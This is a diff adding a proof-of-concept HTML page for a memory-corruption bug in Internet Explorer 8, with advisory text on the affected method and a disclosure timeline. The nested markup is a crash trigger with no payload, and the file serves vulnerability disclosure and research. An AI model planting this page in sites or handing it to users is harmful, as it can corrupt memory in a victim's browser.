@@ -1,0 +1,43 @@
+<!--
+Source: http://blog.skylined.nl/20161121001.html
+
+Synopsis
+
+A specially crafted web-page can cause an unknown type of memory corruption in Microsoft Internet Explorer 8. This vulnerability can cause the Ptls5::Ls­Find­Span­Visual­Boundaries method (or other methods called by it) to access arbitrary memory.
+
+Known affected software, attack vectors and mitigations
+
+Microsoft Internet Explorer 8
+
+An attacker would need to get a target user to open a specially crafted web-page. Java­Script is not necessarily required to trigger the issue.
+
+Description
+
+The memory corruption causes the Ptls5::Ls­Find­Span­Visual­Boundaries method to access data at seemingly random addresses. However, these addresses appear to always be in the same range as valid heap addresses, even if they are often not DWORD aligned. The reason for the memory corruption is not immediately obvious.
+
+Repro.html
+-->
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <body>
+    <button>
+      <pre>
+        <x>
+          <sub>
+            <ruby>
+              <img height="1"/>
+            </ruby>
+          </sub>
+        </x>
+      </pre>
+    </button>
+  </body>
+</html>
+
+<!--
+Time-line
+
+July 2014: This vulnerability was found through fuzzing.
+November 2016: Details of this issue are released.
+-->
